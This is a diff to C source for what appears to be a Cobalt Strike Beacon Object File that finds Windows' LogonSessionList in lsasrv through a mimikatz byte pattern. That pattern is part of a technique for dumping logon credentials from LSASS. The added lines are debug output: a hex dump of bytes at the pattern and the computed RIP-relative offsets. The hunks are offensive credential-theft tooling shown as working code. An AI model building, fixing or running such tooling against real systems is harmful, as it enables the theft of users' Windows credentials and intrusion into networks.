@@ -86,6 +86,7 @@ DWORD64 SearchForLogonSessionListHead(HANDLE hFile, DWORD64 DataSectionBase, DWO
         return 0;
     }
     BeaconPrintf(CALLBACK_OUTPUT, "[+] Found LogonSessionList signature at offset 0x%lx.\n", LogonSessionListSigOffset);
+    BeaconPrintf(CALLBACK_OUTPUT, "[DBG] lsasrvImageBase=0x%llx TextBase=0x%llx\n", (DWORD64)lsasrvImageBase, (DWORD64)lsasrvTextBase);
 
     //
     // If we found the pattern we can proceed with getting the actual address
@@ -93,6 +94,16 @@ DWORD64 SearchForLogonSessionListHead(HANDLE hFile, DWORD64 DataSectionBase, DWO
 
     /* Get the full address where the mimikatz byte pattern was found */
     PBYTE LogonSessionList_PatternAddress = lsasrvTextBase + LogonSessionListSigOffset + LogonSessionList_OFFSET;
+
+    /* Dump 50 bytes starting at the pattern so offsets can be verified */
+    PBYTE dbgBase = lsasrvTextBase + LogonSessionListSigOffset;
+    for (int di = 0; di < 50; di += 10)
+    {
+        BeaconPrintf(CALLBACK_OUTPUT, "[DBG] +%02d: %02x %02x %02x %02x %02x  %02x %02x %02x %02x %02x\n",
+            di,
+            dbgBase[di+0], dbgBase[di+1], dbgBase[di+2], dbgBase[di+3], dbgBase[di+4],
+            dbgBase[di+5], dbgBase[di+6], dbgBase[di+7], dbgBase[di+8], dbgBase[di+9]);
+    }
 
     /*
         Now get the RIP offset from the pattern address so we can use it later.
@@ -104,6 +115,9 @@ DWORD64 SearchForLogonSessionListHead(HANDLE hFile, DWORD64 DataSectionBase, DWO
         (LogonSessionList_PatternAddress[2] << 16) |
         (LogonSessionList_PatternAddress[1] << 8) |
         (LogonSessionList_PatternAddress[0]);
+
+    BeaconPrintf(CALLBACK_OUTPUT, "[DBG] OFFSET=%d RipOffset=0x%x (%d) Correction=%d\n",
+        LogonSessionList_OFFSET, (DWORD)LogonSessionList_RipOffset, LogonSessionList_RipOffset, RipCorrection);
 
     /*
         RIP-relative offsets are signed 32-bit displacements, sign-extended by the CPU.
